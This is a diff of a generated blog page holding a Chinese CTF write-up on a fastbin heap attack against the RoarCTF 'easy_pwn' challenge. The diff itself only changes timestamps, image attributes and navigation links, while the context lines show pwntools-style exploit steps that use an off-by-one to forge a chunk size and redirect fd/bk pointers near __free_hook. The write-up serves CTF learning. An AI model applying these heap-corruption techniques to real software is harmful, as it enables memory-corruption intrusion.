@@ -103,7 +103,7 @@
 <meta property="og:image" content="http://yoursite.com/2019/10/28/fastedbin-attack-探究/1571553628633.png">
 <meta property="og:image" content="http://yoursite.com/2019/10/28/fastedbin-attack-探究/1571557000576.png">
 <meta property="og:image" content="http://yoursite.com/2019/10/28/fastedbin-attack-探究/1571554995553.png">
-<meta property="og:updated_time" content="2019-10-28T15:21:30.295Z">
+<meta property="og:updated_time" content="2019-10-28T15:29:06.219Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="fastedbin attack 探究">
 <meta name="twitter:description" content="总结一下， fasted bin attack有两种打法 一种是利用free函数释放真的chunk或伪造的chunk，然后再次申请chunk进行攻击。（这种菜鸡还没遇到，遇到了马上补上） 第二种是利用fd指针，将其修改，进行堆块的任意地址分配，从而达到任意地址写。 第二种：利用fd指针easy_pwn这题来源于roar ctf。 这题的漏洞点在于write的时候出现了off by one漏洞，漏洞">
@@ -418,27 +418,27 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x18</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#3</span></span><br></pre></td></tr></table></figure>
 
 <p>此处先构造好堆块，为什么设置0x18呢。</p>
- <img src="/2019/10/28/fastedbin-attack-探究/1571551706196.png" title="This is an example image"> 
+ <img src="/2019/10/28/fastedbin-attack-探究/1571551706196.png"> 
 
 <p>这题的规则就是你create的size位多少，它就允许你写入多少，off by one修改下一堆块的size位的话，自然需要0x18的size，覆盖pre_size，使得off by one能够覆盖下一堆块的size位。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">0</span>,<span class="number">0x18</span> +<span class="number">10</span>, <span class="string">'a'</span>*<span class="number">0x18</span> + p8(<span class="number">0x91</span>) )</span><br></pre></td></tr></table></figure>
 
-<img src="/2019/10/28/fastedbin-attack-探究/1571551912003.png" title="This is an example image">
+<img src="/2019/10/28/fastedbin-attack-探究/1571551912003.png">
 
 <p>成功修改！</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
 
 <p>将整个0x91的伪造堆块放入unsorted bin里面</p>
-<img src="/2019/10/28/fastedbin-attack-探究/1571552115654.png" title="This is an example image">
+<img src="/2019/10/28/fastedbin-attack-探究/1571552115654.png">
 
-<img src="/2019/10/28/fastedbin-attack-探究/1571552133076.png" title="This is an example image">
+<img src="/2019/10/28/fastedbin-attack-探究/1571552133076.png">
 
 
 
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x18</span>)</span><br></pre></td></tr></table></figure>
 
 <p>这里是为了create分割堆块，使得unsorted bin的地址落入第三个堆块的内容里。同时为了下面的fastedbin attack做准备。</p>
-<img src="/2019/10/28/fastedbin-attack-探究/1571552279804.png" title="This is an example image">
+<img src="/2019/10/28/fastedbin-attack-探究/1571552279804.png">
 
 
 
@@ -448,26 +448,26 @@
 <p>因为偏移量是不变的</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">2</span>, <span class="number">0x10</span>, p64(<span class="number">0</span>) + p64(libc_addr + libc.symbols[<span class="string">'__free_hook'</span>] - <span class="number">0x40</span>))</span><br><span class="line">gdb.attach(sh)</span><br></pre></td></tr></table></figure>
 
-<img src="/2019/10/28/fastedbin-attack-探究/1571553593599.png" title="This is an example image">
+<img src="/2019/10/28/fastedbin-attack-探究/1571553593599.png">
 
 <p>此处修改bk为__free_hook - 0x40的地址</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x68</span>)<span class="comment">#4</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br></pre></td></tr></table></figure>
 
-<img src="/2019/10/28/fastedbin-attack-探究/1571556976417.png" title="This is an example image"> 
+<img src="/2019/10/28/fastedbin-attack-探究/1571556976417.png"> 
 
-<img src="/2019/10/28/fastedbin-attack-探究/1571553628633.png" title="This is an example image"> 
+<img src="/2019/10/28/fastedbin-attack-探究/1571553628633.png"> 
 
 <p>此处为了使得fasted bin 0x70里面存在free后的堆块，使得后面fd攻击成功</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">2</span>, <span class="number">8</span>, p64(libc_addr + libc.symbols[<span class="string">'__free_hook'</span>] - <span class="number">0x33</span>))</span><br></pre></td></tr></table></figure>
 
 <p>修改fd位</p>
-<img src="/2019/10/28/fastedbin-attack-探究/1571557000576.png" title="This is an example image">
+<img src="/2019/10/28/fastedbin-attack-探究/1571557000576.png">
 
 
 
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x68</span>)<span class="comment">#5</span></span><br></pre></td></tr></table></figure>
 
-<img src="/2019/10/28/fastedbin-attack-探究/1571554995553.png" title="This is an example image">
+<img src="/2019/10/28/fastedbin-attack-探究/1571554995553.png">
 
 
 
@@ -552,8 +552,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/10/23/对于canary的ssp leak打法的学习（好像又名Stack smash）/" rel="next" title="对于canary的ssp leak打法的学习（好像又名Stack smash）">
-                <i class="fa fa-chevron-left"></i> 对于canary的ssp leak打法的学习（好像又名Stack smash）
+              <a href="/2019/10/19/360赛/" rel="next" title="360赛">
+                <i class="fa fa-chevron-left"></i> 360赛
               </a>
             
           </div>
@@ -561,6 +561,10 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/10/28/对于canary的ssp-leak打法的学习（好像又名Stack-smash）/" rel="prev" title="对于canary的ssp leak打法的学习（好像又名Stack smash）">
+                对于canary的ssp leak打法的学习（好像又名Stack smash） <i class="fa fa-chevron-right"></i>
+              </a>
             
           </div>
         </div>
